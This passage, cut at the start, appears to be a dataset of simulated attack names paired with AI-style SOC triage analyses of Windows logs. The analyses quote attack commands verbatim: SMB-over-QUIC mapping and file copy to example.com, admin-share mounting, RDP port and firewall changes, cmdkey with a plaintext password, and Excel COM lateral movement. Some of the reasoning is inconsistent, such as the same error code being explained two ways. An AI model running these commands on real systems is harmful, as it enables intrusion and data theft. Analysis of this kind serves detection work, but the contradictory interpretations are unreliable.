   - A PowerShell command is executed to create a new network drive with `New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$`. This command is suspicious because it involves accessing an administrative network share (C$), which usually requires administrative privileges and can be used to exfiltrate data or stage subsequent attacks. This activity requires further investigation to verify legitimacy.

3. **Sysmon Log:**
   - There are records of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. `wevtutil` is a legitimate tool but can be leveraged by attackers for log manipulation, an indicator of potential malicious intent.
   - The execution of system utilities like `hostname.exe`, `whoami.exe`, and PowerShell scripts suggests enumeration activity. While not immediately malicious, it could be part of a reconnaissance phase within an attack.
   - Standard updates and installations, such as for Microsoft Edge, are logged, suggesting normal system maintenance activity.

4. **Security Log:**
   - There are logs indicating successful login events using NTLM authentication (EventID 4624) for the user `admin_test`. Privileges associated with the user include sensitive ones such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, indicating administrative access.
   - The logs do not show unsuccessful logon attempts or account lockouts, which might indicate password-guessing or brute force attacks.
   - A series of `EventID 5379` entries indicate possible failed credential readings but the `ReturnCode` signifies no critical failures typical in authenticating Microsoft accounts. 

### Assessment & Threats

- **Suspicious Behavior:**
  - The execution of PowerShell to access a remote administrative share is anomalous and could suggest unauthorized attempts to access or move data.
  - The repeated use of `wevtutil` could be indicative of log clearing or manipulation attempts.
  - The presence of high privileges in user sessions suggests a potential risk if access is gained maliciously.

### Guidance

- **Immediate Actions:**
  - Investigate the PowerShell commands and the necessity of accessing remote shares by `admin_test`. Validate if it fits their normal activity patterns or legitimate administrative needs.
  - Examine the purpose behind execution of `wevtutil.exe` by `admin_test` to determine if log manipulation is present.
  - Conduct a review on network activity from this host around the time of these events to detect unusual data flows.

### Resolution

- **SUSPICIOUS**  
  - The logs present activities such as PowerShell scripting to access administrative shares and the use of potentially log-manipulative tools which are unusual and warrant further investigation to rule out malicious activities."
Exfiltration Over SMB over QUIC (New-SmbMapping),"**Detailed Analysis of the Logs:**

Upon reviewing the provided Sysmon, Security, Windows PowerShell, Application, and System logs for Server002, there are multiple entries suggestive of potential anomalous or suspicious behavior.

1. **Sysmon Log Analysis**:
   - The repeated execution of `C:\Windows\System32\wevtutil.exe` and quickly following `C:\Windows\System32\conhost.exe` several times could indicate a potential attempt to clear event logs or manipulate them for cover-up purposes. While `wevtutil.exe` is a legitimate tool, its misuse is common in stealth operations.
   - The usage of `Powershell.exe` with the command for SMB mapping and file copying (`New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck, copy 'C:\\path\\to\\file.txt' 'Z:\\'`) is suspicious. This indicates potential unauthorized data exfiltration or lateral movement.
   - The execution of `whoami.exe` and `hostname.exe` amidst the activity could suggest reconnaissance attempts to gain information about the logged-on user and the machine's hostname.

2. **Security Log Analysis**:
   - The logs record a change in system time which could suggest an attempt to tamper with log timestamps to confuse investigation or cover tracks.

3. **Windows PowerShell Log Analysis**:
   - The logs confirm the suspicious PowerShell execution for SMB mapping and file copying. The clear mention of `SkipCertificateCheck` is concerning as it bypasses standard security checks and further suggests potential malicious activity.
   - A warning log is generated indicating the drive 'Z:\\' is inaccessible, hinting at a possible blocked attempt to use the mapped drive.

4. **Application Log Analysis**:
   - Observed normal Edge update operations which appear benign and expected.

5. **System Log Analysis**:
   - Consistent with security log entries, there are time-change records present. It is unusual to see multiple closely spaced entries, which supports the suspicion regarding tampering.

**Assessment of the Situation:**

The combination of what appears to be an attempt at logs clearing (via `wevtutil.exe`), SMB mapping with security bypass, and system time manipulation suggests the activity on Server002 is suspicious and potentially part of a malicious act attempting data theft or unauthorized system changes.

**Threats or Risks Identified:**
- Potential unauthorized access and reconnaissance within the network.
- Possible data exfiltration attempts via unconventional SMB mapping.
- Manipulation of system log times possibly to disguise activity traces.

**Guidance on How to Proceed:**
1. **Immediate Actions**:
   - Isolate Server002 from the network to prevent potential compromise propagation.
   - Initiate full disk and network scope analysis for any further malicious indicators.
   - Preserve and collect full log data, especially focusing on PowerShell, Sysmon logs around the time of the detected suspicious activities.

2. **Long-term Actions**:
   - Conduct a security audit focusing on PowerShell script usage permissions and SMB mappings.
   - Enhance detection for misuse of `wevtutil.exe` and unexpected PowerShell executions.
   - Monitor and review changes in system time settings to prevent any unauthorized manipulations.

**Final Resolution**: **SUSPICIOUS** - The activities described in the logs do not align with normal administrative tasks and could indicate a potential compromise. Further investigation is warranted to ascertain the true nature of the activities and to rule out malicious intent."
Copy and Execute File with PsExec,"### Detailed Log Analysis

#### Overview of Events:
The provided logs from the Windows environment consist of entries from the Application, Security, System, Sysmon, and Windows PowerShell channels. Key indicators of potential malicious activity include unusual process execution, privilege escalation, and command-line arguments that suggest exploitation or compromising behavior.

#### Key Observations:

1. **PsExec Usage:**
   - **System Log Event**: A service named `PSEXESVC` was initiated (Event ID 7045), indicating the potential use of PsExec, a legitimate tool often used by system administrators but also exploited by attackers for unauthorized remote execution. PsExec enables the execution of processes on remote systems.
   - **Sysmon Log**: Event ID 1 logs show `PsExec.exe` is executed (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\PsExec.exe`), followed by the creation of the `PSEXESVC` process (`C:\\Windows\\PSEXESVC.exe`). This use aligns with the PsExec service start.

2. **Unusual Command Execution:**
   - The execution of `cmd.exe` and `wevtutil.exe` processes by `admin_test` (Sysmon Event IDs 1 and 5), suggest possible manipulation of log settings or an intent to clear event logs, which is a known tactic used by adversaries to cover tracks.
   - There are multiple PowerShell executions (`powershell.exe`) observed under `admin_test`, indicating potential scripting activity which can either be automated administrative tasks or malicious scripts.

3. **Elevation and Privilege Assignment:**
   - Multiple occurrences of Security log Event ID 4672 highlight special privilege assignments to `SYSTEM` and `admin_test` users. Privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege` are sensitive and can be exploited for privilege escalation or lateral movement.
   
4. **Edge Update Installer Behavior:**
   - Numerous processes associated with Microsoft Edge update and installation are seen (`MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`, `setup.exe`), which mostly appear routine. However, they could potentially be used to mask malicious activities if they diverge from normal operation contexts.

5. **Suspicious Logon Sessions:**
   - The logon type 3 (network logon) by the `admin_test` user from an external workstation (`DESKTOP-3HL5B2P` IP: `fe80::e3b5:5371:12a8:9c77`), especially in conjunction with elevated privileges, might imply remote access attempts or lateral movement activities.

#### Potential Threats Identified:
- The use of PsExec suggests potential for unauthorized remote command execution, often a sign of lateral movement within compromised networks.
- Execution of `wevtutil.exe` and PowerShell scripting activities could indicate log manipulation or script execution, either for legitimate admin tasks or script-based attacks.
- Special privileges granted (`SeDebugPrivilege`, `SeImpersonatePrivilege`) to users, especially when seen with network logon sessions and non-interactive commands, are indicators of potential privilege escalation exploitation.

### Assessment and Resolution:
**Resolution: SUSPICIOUS**

The activities in the log suggest suspicious behavior that requires further investigation to rule out malicious intent. The usage of PsExec could be legitimate or indicative of lateral movement; however, given the presence of privilege escalation, log manipulation attempts, and network-based logons, these warrant an in-depth review to ensure they are not part of a cyber intrusion or attack scenario.

### Recommended Actions:
1. **Incident Response:**
   - Investigate the context of the PsExec usage and confirm whether it aligns with authorized administrative tasks.
   - Review the purpose and origin of the PowerShell and wevtutil executions involving `admin_test`.
  
2. **Monitoring and Threat Detection:**
   - Enhance monitoring for further unauthorized privilege assignments and abnormal logon sessions.
   - Implement additional logging and alerts for process creations involving commonly abused binaries like `cmd.exe`, `PsExec`, and PowerShell.

3. **User and Access Controls:**
   - Validate the access permissions and roles of the `admin_test` account.
   - Implement least privilege policies and regular audits of privilege escalation events.

Further action must be taken based on the results of these investigations to ensure network security integrity."
Changing RDP Port to Non Standard Port via Powershell,"After analyzing the provided logs, here is a summary of findings highlighting potential indicators of suspicious or malicious activity:

### Security Log:
- **EventID 5379**: Multiple entries with a `ReturnCode` of `3221226021`, indicating access to credentials failed (STATUS_LOGON_FAILURE). This suggests attempts to access credentials for `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive`. However, given the sheer number of attempts, this could be automated, suggesting unusual or unauthorized behavior.

### System Log:
- **Windows Update Client Events**: Successful updates of Microsoft Defender Antivirus indicate antivirus definitions are up to date, which is generally a positive indicator for security.

### Sysmon Log:
- **EventID 1 and 5**: Observations include the execution of native Windows binaries like `whoami.exe`, `conhost.exe`, `hostname.exe`, and `wevtutil.exe`. The use of `wevtutil.exe` often relates to event log management and could indicate attempts to manipulate or clear logs, potentially malicious if unauthorized. However, these entries alone do not confirm malicious activity.
- **PowerShell Execution**: Identified PowerShell script executed that modifies the RDP port and adds a new firewall rule:
  - **CommandLine**: `""powershell.exe"" & {Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name \""PortNumber\"" -Value 4489, New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489}`
  - This indicates a potential unauthorized change to Remote Desktop Protocol (RDP) settings by changing the port number and allowing inbound connections, which can often be associated with lateral movement or maintaining persistence.

### Application Log:
- **Windows Defender**: An event indicating Windows Defender is actively running in a protective state (`SECURITY_PRODUCT_STATE_ON`).

### Windows PowerShell Log:
- Consistent with Sysmon logs, PowerShell events highlight execution of a script modifying RDP settings, which, without authorization, could be indicative of lateral movement or backdoor establishment.

### Assessment:
- The use of PowerShell to modify RDP settings without clear justification, along with the potential credential access attempts, suggest potentially unauthorized and malicious activities.

### Resolution:
- **MALICIOUS**: These logs suggest malicious activity, specifically unauthorized modifications to RDP settings, which could allow unauthorized remote access to this host. Additionally, failed attempts to access credentials hint at possible unauthorized account access attempts.

### Guidance:
1. **Immediate Actions**:
   - Revert unauthorized RDP configuration changes back to the default or previous state.
   - Conduct a full review of remote access logs and permissions to detect unauthorized access.
   - Examine other hosts in the network for similar indicators of compromise (IOCs).
   - Investigate potential unauthorized users or applications that executed these changes.

2. **Forensic Analysis**:
   - Deep dive into additional logs (both local and network) for the complete understanding of the actions taken.
   - Establish a timeline and scope of potential compromise.

3. **Preventive Measures**:
   - Strengthen monitoring and alerting for similar activities, particularly around PowerShell usage and RDP configuration changes.
   - Review and tighten access control policies, ensuring that only authorized users can execute admin-level PowerShell scripts.
   - Consider network segmentation to isolate critical assets from potentially compromised clients."
PDQ Deploy RAT,"After reviewing the provided logs, here is a detailed analysis:

### System Log Analysis:
1. **Event ID 7045** indicating a new service installation: 
   - **Service Name**: `PDQ Deploy`
   - **Image Path**: `""C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\PDQDeployService.exe"" service`
   - **Account Name**: `LocalSystem`

   This event shows the installation of a PDQ Deploy service. While PDQ Deploy is a legitimate tool used for deploying software, its presence on a high-value machine like a CEO's computer should be verified unless its use has been sanctioned as part of IT operations.

### PowerShell Log Analysis:
1. PowerShell is used to download and install the `PDQ Deploy` installer from a remote URL (`https://download.pdq.com/release/19/Deploy_19.3.350.0.exe`). 
2. The execution policy is set to `Restricted`, which requires further context because this policy usually restricts script execution.
3. The PowerShell script creates directories and downloads files, actions typically associated with software installation or updates.

These events might align with intended administrative tasks, but without clear authorizations or scheduling information, they could be indicators of misuse.

### Sysmon Log Analysis:
1. **Process Creation**: We see several instances of the following:
   - `cmd.exe` and `conhost.exe` are being used to initiate processes. This may align with legitimate software deployment tasks, though regular monitoring of command-line usage can distinguish between normal and anomalous behavior.
   - Frequent execution of native Windows binaries such as `hostname.exe`, `whoami.exe`, `SearchProtocolHost.exe`, and others appear routine but should be checked to ensure they align with expected activity on a high-value system like a CEO's machine.

2. Multiple processes (`msiexec.exe`, `conhost.exe`, etc.) are observed under the user `SERVER002\\admin_test`, implying administrative tasks or software installations. Again, these should be cross-referenced with authorized activity.

### Application Log Analysis:
1. The PDQ Deploy installation is confirmed by Event ID 11707, where it states the installation completed successfully.
2. Supporting events refer to the installation involving `.msi` files.

### Threat Assessment:
- **Tools Like PDQ Deploy**: Legitimate for administrative use in IT environments. However, on a CEO's machine, the installation of such tools should be carefully audited.
- **PowerShell Activity**: Indicates downloading and execution of a remote executable, which can point to software deployment and updates; however, can also be employed for malware distribution if not verified.

### Conclusion:
The activities logged are suggestive of software installation and update tasks that could be routine in many IT environments. However, due to the contextâ€”occurrence on a CEO's machineâ€”it requires validation; the key is determining whether this aligns with accepted support practices.

### Resolution: **SUSPICIOUS**
- **Actions**:
  - Verify the legitimacy and authorization of the PDQ Deploy service installation.
  - Cross-reference with IT management records to confirm if these actions were scheduled and by whom.
  - Establish a baseline of expected administrative activity on the system to distinguish between legitimate and potentially harmful actions.
  - Monitor for recurring similar activities and consider stronger EDR rule sets to flag similar unscheduled activities in the future."
Deploy 7-Zip Using Chocolatey,"### Detailed Analysis of the Logs

Upon reviewing the provided logs, there are several components of interest, and the following points summarize the analysis:

1. **Application Logs**:
   - The application logs show that the *edgeupdate* service stopped twice sequentially around the same time frame. However, stopping services can be a routine event, particularly for update services or system restarts.

2. **Sysmon Logs**:
   - **Microsoft Edge Update Activity**: 
     - Several events relate to the `MicrosoftEdgeUpdate.exe` process. The process is initiating with various command-line arguments associated with updating tasks (e.g., `/update`, `/regsvc`, `/svc`). This behavior is typical for update services, suggesting a legitimate software updating mechanism.
   - **PowerShell Activity**:
     - The execution of `PowerShell.exe` with a command (`choco install -y 7zip`) is observed. Using Chocolatey (a package manager for Windows) to install a commonly used application like 7-Zip is typical system administration activity.
     - The PowerShell script uses high integrity, but the actions performed are consistent with software installation/automation, and no malicious commands seem evident based on the provided command description.
   - **Other Windows Executables**:
     - There are entries for common Windows utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` (Windows Event Log Utility), all initiated by a user (`SERVER002\\admin_test`). This could indicate normal administrative activity depending on the context within which they were executed.
   - **Conhost.exe Process**:
     - `conhost.exe` is a legitimate Windows component providing console support for command prompt processes. The multiple `conhost.exe` instances are likely related to console operations triggering other command-line utilities.

3. **Windows PowerShell Logs**:
   - Logs indicate the successful execution of a PowerShell session with provisions to install 7-Zip using Chocolatey - a benign and transparent operation if conducted within normal administrative operations.

4. **Security Logs**:
   - The security logs contain no entries in the present context, providing no additional data points regarding potential unauthorized activities or compromise attempts in this specific analysis window.

### Assessment

- **Anomalous Behavior**: None of the logged activities exhibit clearly malicious intent. The execution of system utilities and update processes appear to align with typical administrative and system update procedures.
- **Indicators of Malicious Activity**: No evident malicious activity or indicators of compromise are observed within the logs.
- **Potential Risks**: Should the logs represent unauthorized or unexpected activity without context (e.g., administrative permissions or scheduled updates), a further inquiry with involved personnel is warranted to confirm intent.

### Resolution

- **Resolution**: **BENIGN**

### Guidance

1. **Monitoring**: Continue to monitor for any further unexpected anomalies or alterations in behavior, especially if conducted without explicit administrative consent.
2. **Confirm Administrative Actions**: Verify with the IT administration team if the PowerShell command and Edge updates were scheduled tasks or known actions.
3. **Routine Audit**: Conduct routine audits on sensitive systems such as the CEO's machine to verify compliance with access and change control policies.
"
Changing RDP Port to Non Standard Port via Command_Prompt,"Upon reviewing the provided logs, the following activities have been identified as potentially suspicious:

1. **Event 4672 - Special Privileges Assigned**: The user `admin_test` was granted a number of high-level privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeTakeOwnershipPrivilege`. While this could be legitimate if performed by an authorized administrator, it is suspicious if `admin_test` is not supposed to have such privileges or if no legitimate operation required this privilege escalation.

2. **Event 4624 - Successful Logon** and **4634 - Logoff**: There was a network logon (`LogonType: 3`) by `admin_test` from a workstation named `DESKTOP-3HL5B2P` using NTLM authentication with an IPv6 address. The successful logon correlates temporally, suggesting this session may have been used for subsequent suspicious activities, such as privilege assignment and registry modifications.

3. **Sysmon Events involving cmd.exe**: A command was executed through `cmd.exe` which modified the registry to change the RDP port and added a firewall rule with `netsh`. The command in question:
   ```
   ""cmd.exe"" /c reg add ""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 4489 /f & netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489
   ```
   Modifying RDP settings and firewall rules can be indicative of an attempt to create unauthorized remote access.

4. **Event 4799 - Enumeration of Local Administrator Groups**: The execution of a process from `EdgeUpdate` setup seems unrelated directly to any known legitimate software installation or updates, raising potential concerns due to its timing and nature.

5. **Use of `wevtutil.exe` and `conhost.exe` repeatedly**: The use of `wevtutil.exe`, which is often seen in log manipulation and `conhost.exe` can imply attempts to hide activities.

6. **Conclusion**: The combination of privilege escalation, modification of RDP settings, and enumeration-like behavior strongly suggest attempts at establishing or maintaining unauthorized access. These actions are characteristic of potentially malicious activity, especially given they occur around the `admin_test` session and involve tools and techniques frequently used in lateral movement or persistence in compromised environments.

Resolution: **MALICIOUS**

### Guidance on how to proceed:
- **Immediate Actions**:
  - Revoke unnecessary privileges assigned to `admin_test`.
  - Investigate the source of the `admin_test` account usage, especially the IP and workstation mentioned.
  - Review and possibly restrict access or further investigate machines communicating with `DESKTOP-3HL5B2P`.
  
- **Further Investigation**:
  - Review user activity logs to determine any unauthorized access or data exfiltration.
  - Check network logs for unusual or unauthorized RDP sessions.
  - Conduct a threat hunt for known malicious indicators associated with these activities across the network.

- **Mitigations**:
  - Reset passwords and enforce multi-factor authentication for accounts with elevated privileges.
  - Harden RDP access with network-level authentication and monitoring for unusual activities.
  
- **Follow-Up**:
  - Conduct a thorough review of server and security group policies to prevent similar incidents.
  - Provide security awareness training to privileged users to recognize signs of account compromise."
RDP to DomainController,"### Analysis:

#### Security Log Analysis:
- **Event ID 5379 (Credential Validation Attempt)**:
  - Multiple instances of this event are recorded, all indicating failed credential retrieval with `ReturnCode` 3221226021 which typically means `STATUS_NO_SUCH_LOGON_SESSION`. This error can occur due to attempted access with invalid credentials or incorrect account name. The repeated attempts targeting a Microsoft Account user `02txoixylodcstop` over a very short period are unusual and could indicate a script or automated tool attempting to guess or validate credentials.

- **Event ID 4624 (Successful Logon) and 4672 (Privileged Logon)**:
  - The SYSTEM account (S-1-5-18) logs on using logon type 5, which is a service logon (used by services to log on to the system) and has elevated privileges. While this is a legitimate event under normal circumstances (like system boot or service startup), it follows immediately after the failed credential attempts, raising suspicions about potential privilege escalation attempts using valid system accounts post failed attempts.

#### System Log Analysis:
- **Windows Update Events (Event IDs 44 and 43)**:
  - Updates for Microsoft Defender Antivirus have been noted, indicating the system is receiving security updates. No suspicious activity detected relating to system updates.

#### Sysmon Log Analysis:
- **Powershell and Command Line Tool Activity**:
  - Notably, there is a PowerShell execution linked to `SERVER002\admin_test` account attempting to establish an RDP connection using `cmdkey` with credentials `1password2!`. This activity appears scripted or automated and uses a known weak password pattern. The action of setting up RDP credentials is suspicious unless cleared by the proper administrative context.
  
- **Process Creation Related to Sysadmin Tools**:
  - Multiple utilities such as `wevtutil`, `whoami`, and `cmdkey` running under the context of `SERVER002\admin_test`. `whoami` and `cmdkey` in combination often suggest account enumeration or credential managementâ€”behaviors potentially associated with lateral movement or persistence.

- **Parent-Child Process Relationship**:
  - Several command console hosts (`conhost.exe`) are spawned by other processes like `hostname.exe` and `whoami.exe`, which might represent a legitimate administrative session but alongside the credential operations could suggest malicious use.

### Assessment:
There is a mix of normal administrative activities, update operations, and suspicious credential-based activities within these logs. The involvement of specific tools like `cmdkey` and PowerShell with weak password strings, coupled with failed credential retrieval and subsequent SYSTEM logon activity, raises alarms.

### Resolution:
- **SUSPICIOUS**: Given the blend of normal update activities and the suspicious PowerShell and credential management attempts, further investigation is required. Validate the legitimacy of the PowerShell script and any administrative actions for unauthorized behavior or privilege misuse.

### Guidance:
1. **Immediate Investigation**: Review the context under which the suspicious PowerShell script and credential operations were executed. Determine if the user `SERVER002\admin_test` legitimately performed these actions.
2. **Account Review**: Audit and reset any involved accounts, particularly `SERVER002\admin_test` if deemed necessary, and ensure strong, complex passwords are enforced.
3. **Environment Monitoring**: Increase monitoring on similar activities involving PowerShell and command line tools to quickly detect potential compromise.
4. **Security Controls**: Consider deploying additional layers of security controls such as multifactor authentication where possible to mitigate credential-based attacks.

This suspicious activity requires attention to rule out or confirm any present threats and maintain security integrity within the organization."
PowerShell Lateral Movement Using Excel Application Object,"### Detailed Analysis:

Upon examining the provided Windows event logs, we can see a mix of routine system updates, application installations, and potentially suspicious use of PowerShell. Below is a detailed analysis of these observations:

#### 1. **System Log:**
- The logs contain events related to Windows Update. Specifically, updates to Microsoft Defender Antivirus (Event IDs 44, 43, 19) are noted. These are routine and typical of a system that is keeping its antivirus signatures up to date. 
- No unusual activity or clear signs of compromise are present in these events.

#### 2. **PowerShell Log:**
- A PowerShell script was executed (`EventID: 600` across multiple logs) with a command to copy `calc.exe` to a different directory and instantiate an Excel application object. This execution is unusual for several reasons:
  - The renaming of `calc.exe` to `foxprow.exe` could be an attempt to disguise a legitimate file for malicious purposes.
  - Instantiating an Excel COM object from a PowerShell script may indicate an attempt to use Excel for script automation or possible exploitation. 
  - The failure to perform the copy operation (`EventID: 300`) due to a path error suggests either misconfiguration or a failed malicious attempt.

#### 3. **Sysmon Log:**
- Several processes related to system and Microsoft Edge updates are present. These processes (including `MicrosoftEdgeUpdate.exe`, `AM_Delta.exe`, and `MpSigStub.exe`) are related to the routine update and maintenance of system software and do not by themselves indicate malicious activity.
- The PowerShell session was executed under a user `SERVER002\\admin_test` with high integrity, consistent with the PowerShell logs showing unusual activity.
- The frequent execution of system utilities like `wevtutil.exe` and `conhost.exe` might be misdirection; these processes can be used by administrators for routine tasks and are not inherently suspicious.

### Assessment and Resolution:

- **Suspicious Behavior**: The use of PowerShell to copy and rename executables combined with COM object creation suggests a potential boundary-push or exploration for misuse, which could be associated with an internally authored script or a testing scenario not properly documented.
- **Update and Installation Activities**: Routine updates of system components like Microsoft Defender and Microsoft Edge do not raise any red flags.
  
### **Resolution: SUSPICIOUS**

The logs show potential indicators of suspicious activity, primarily centered around the use of PowerShell. The copying of `calc.exe` and COM object creation is unusual and, combined with access level and script details, necessitates further investigation. This activity should be cross-referenced with known authorized scripts or processes. Additionally, the user `SERVER002\admin_test` and the execution context should be reviewed to determine if this was authorized or expected. 

**Guidance on How to Proceed:**
- **Review User Actions**: Investigate the user account `SERVER002\\admin_test` for recent activities and verify if these actions were authorized or documented by system administrators or developers.
- **Analyze PowerShell Script**: Examine the PowerShell commands executed to understand their purpose and whether they match any legitimate scripts in use within the organization.
- **Confirm with Security Team**: Check with the security team or any individuals responsible for automation or scripting to confirm if these actions align with their activities.
- **Monitor for Recurrences**: Specifically watch for recurring patterns or similar behavior that could indicate a larger issue.

The provided logs do not definitively prove malicious activity but certainly warrant closer scrutiny to ensure system integrity and security."
